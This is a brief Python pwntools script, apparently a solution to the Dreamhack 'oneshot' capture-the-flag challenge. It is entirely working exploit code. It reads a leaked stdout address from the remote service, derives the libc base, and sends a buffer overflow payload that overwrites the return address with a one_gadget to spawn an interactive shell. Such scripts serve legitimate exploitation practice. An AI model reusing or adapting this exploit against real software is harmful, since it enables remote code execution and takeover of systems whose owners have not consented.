from pwn import *

p = remote('host3.dreamhack.games', 14587)
context.log_level = 'debug'
libc = ELF('./libc-2.23.so')
e = ELF('./oneshot')

onegadget = 0xf1247

payload = b'a'*(0x18) + p64(0) + b'a'*0x8

p.recvuntil('stdout: ')
stdout = int(p.recvline()[:-1], 16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
onegadget = libc_base + onegadget

payload += p64(onegadget)
p.sendafter("MSG: ", payload)

p.interactive()

